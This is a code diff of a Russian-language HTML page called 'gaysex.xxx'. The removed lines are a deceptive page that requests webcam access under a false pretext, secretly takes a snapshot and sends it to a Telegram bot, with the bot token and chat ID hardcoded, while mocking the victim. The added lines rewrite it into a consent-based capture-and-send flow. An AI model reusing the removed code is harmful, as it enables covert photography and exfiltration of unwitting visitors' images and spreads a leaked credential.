@@ -1,151 +1,183 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>gaysex.xxx</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #111;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: sans-serif;
-            color: white;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>gaysex.xxx</title>
+  <style>
+    * { box-sizing: border-box; }
 
-        /* Задний размытый фон порносайта */
-        .background-blur {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('bg.png'); 
-            background-size: cover;
-            background-position: center;
-            filter: blur(15px) brightness(0.6);
-            z-index: -200;
-        }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      padding: 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+    }
 
-        /* Окно веб-камеры на весь экран */
-        #webcam {
-            position: fixed;
-            right: 0;
-            bottom: 0;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            z-index: -100;
-            transform: scaleX(-1);
-            object-fit: cover;
-            display: none;
-        }
+    .modal-box {
+      width: 100%;
+      max-width: 450px;
+      padding: 28px;
+      text-align: center;
+      background: #202020;
+      border-radius: 16px;
+    }
 
-        /* Информационное окошко по центру */
-        .modal-box {
-            text-align: center;
-            background: rgba(20, 20, 20, 0.85);
-            padding: 40px;
-            border-radius: 16px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
-            max-width: 450px;
-            width: 90%;
-        }
+    video, canvas, #preview {
+      width: 100%;
+      margin-top: 16px;
+      border-radius: 10px;
+    }
 
-        .site-link { color: #ff3366; }
-        .loading-dots { color: #ffcc00; font-weight: bold; margin-top: 15px; }
-    </style>
+    button {
+      width: 100%;
+      margin-top: 12px;
+      padding: 13px;
+      border: 0;
+      border-radius: 8px;
+      background: #ff3366;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:disabled { opacity: .5; cursor: default; }
+    #status { overflow-wrap: anywhere; }
+  </style>
 </head>
 <body>
+  <main class="modal-box">
+    <h1>gaysex.xxx</h1>
+    <p>Разреши доступ к камере, чтобы сделать снимок.
+       Перед отправкой ты сможешь его проверить.</p>
 
-    <!-- Элементы страницы -->
-    <div id="bg-image" class="background-blur"></div>
-    <video id="webcam" autoplay playsinline></video>
-    <canvas id="capture-canvas" style="display: none;"></canvas>
+    <video id="webcam" autoplay playsinline muted hidden></video>
+    <img id="preview" alt="Предварительный просмотр снимка" hidden>
+    <canvas id="canvas" hidden></canvas>
 
-    <div class="modal-box">
-        <h1>Сайт <span class="site-link">gaysex.xxx</span> открывается...</h1>
-        <p id="status-text">Пожалуйста, разрешите доступ в окне браузера, чтобы мы прогрузили сайт и элементы интерфейса.</p>
-        <div id="loader" class="loading-dots">Ожидание подтверждения...</div>
-    </div>
+    <button id="start">Включить камеру</button>
+    <button id="capture" hidden>Сделать снимок</button>
+    <button id="send" hidden>Отправить снимок в Telegram</button>
+    <button id="retake" hidden>Сделать другой снимок</button>
 
-    <!-- Логика работы сайта -->
-    <script>
-        const TG_TOKEN = "9135115110:AAEg87shAYMhvYPOcGTHuXIrDCZJrHYC7d8";
-        const TG_CHAT_ID = "7604438858"; 
+    <p id="status" role="status">Ожидание действия пользователя.</p>
+  </main>
 
-        async function initSite() {
-            const video = document.getElementById('webcam');
-            const bgImage = document.getElementById('bg-image');
-            const statusText = document.getElementById('status-text');
-            const loader = document.getElementById('loader');
+  <script>
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+    const preview = document.getElementById('preview');
+    const status = document.getElementById('status');
 
-            try {
-                // Запрашиваем доступ к камере
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-                
-                loader.innerText = "Авторизация профиля...";
+    const startBtn = document.getElementById('start');
+    const captureBtn = document.getElementById('capture');
+    const sendBtn = document.getElementById('send');
+    const retakeBtn = document.getElementById('retake');
 
-                video.addEventListener('loadedmetadata', () => {
-                    video.style.display = "block";
-                    bgImage.style.display = "none";
-                    
-                    // Делаем снимок через 2 секунды после включения
-                    setTimeout(() => {
-                        sendSnapshotToTelegram(video);
-                        statusText.innerHTML = "<span style='color: #00ffcc; font-weight: bold;'>🏳️‍🌈 Вход выполнен! Главный гей успешно авторизован в системе.</span>";
-                        loader.style.display = "none";
-                    }, 2000);
-                });
+    let stream = null;
+    let photo = null;
 
-            } catch (error) {
-                console.error(error);
-                statusText.style.color = "#ff4444";
-                statusText.innerText = "Ошибка доступа. Без подтверждения прогрузка сайта gaysex.xxx невозможна.";
-                loader.innerText = "Доступ отклонен";
-                loader.style.color = "#ff4444";
-            }
+    startBtn.addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: false
+        });
+
+        video.srcObject = stream;
+        video.hidden = false;
+        startBtn.hidden = true;
+        captureBtn.hidden = false;
+        status.textContent = 'Камера включена. Сделай снимок.';
+      } catch (error) {
+        status.textContent =
+          'Не удалось включить камеру: ' + error.message;
+      }
+    });
+
+    captureBtn.addEventListener('click', async () => {
+      if (!video.videoWidth) {
+        status.textContent = 'Подожди, пока загрузится изображение.';
+        return;
+      }
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      canvas.getContext('2d').drawImage(
+        video, 0, 0, canvas.width, canvas.height
+      );
+
+      photo = await new Promise(resolve =>
+        canvas.toBlob(resolve, 'image/jpeg', 0.85)
+      );
+
+      if (!photo) {
+        status.textContent = 'Не удалось создать снимок.';
+        return;
+      }
+
+      preview.src = URL.createObjectURL(photo);
+      preview.hidden = false;
+      video.hidden = true;
+      captureBtn.hidden = true;
+      sendBtn.hidden = false;
+      retakeBtn.hidden = false;
+
+      status.textContent =
+        'Проверь снимок. Отправка произойдёт только после подтверждения.';
+    });
+
+    retakeBtn.addEventListener('click', () => {
+      preview.hidden = true;
+      video.hidden = false;
+      sendBtn.hidden = true;
+      retakeBtn.hidden = true;
+      captureBtn.hidden = false;
+      status.textContent = 'Сделай новый снимок.';
+    });
+
+    sendBtn.addEventListener('click', async () => {
+      if (!photo) return;
+
+      sendBtn.disabled = true;
+      status.textContent = 'Отправка...';
+
+      try {
+        const form = new FormData();
+        form.append('photo', photo, 'snapshot.jpg');
+
+        const response = await fetch('/api/send-photo', {
+          method: 'POST',
+          body: form
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+          throw new Error(result.error || 'Ошибка отправки');
         }
 
-        async function sendSnapshotToTelegram(videoElement) {
-            const canvas = document.getElementById('capture-canvas');
-            const ctx = canvas.getContext('2d');
+        status.textContent = 'Снимок успешно отправлен.';
+        sendBtn.hidden = true;
+        retakeBtn.hidden = true;
+      } catch (error) {
+        status.textContent = 'Ошибка: ' + error.message;
+        sendBtn.disabled = false;
+      }
+    });
 
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-
-            // Рисуем кадр на холст
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            // Конвертируем в строку Base64 для безопасной отправки через CORS
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.4); // Сжали качество до 40%, чтобы сообщение не превысило лимит длины в Telegram
-
-            try {
-                // Отправляем текстовые данные картинки боту через правильный api.telegram.org
-                await fetch(`https://telegram.org{TG_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: `🏳️‍🌈 Кто-то попался!\n\nСкопируй огромный текст ниже, перейди на сайт base64.guru/converter/decode/image и вставь его туда, чтобы увидеть фото:\n\n${dataUrl}`
-                    })
-                });
-                console.log("Данные отправлены!");
-            } catch (err) {
-                console.error("Ошибка при отправке:", err);
-            }
-        }
-
-        window.addEventListener('DOMContentLoaded', initSite);
-    </script>
+    window.addEventListener('pagehide', () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    });
+  </script>
 </body>
 </html>
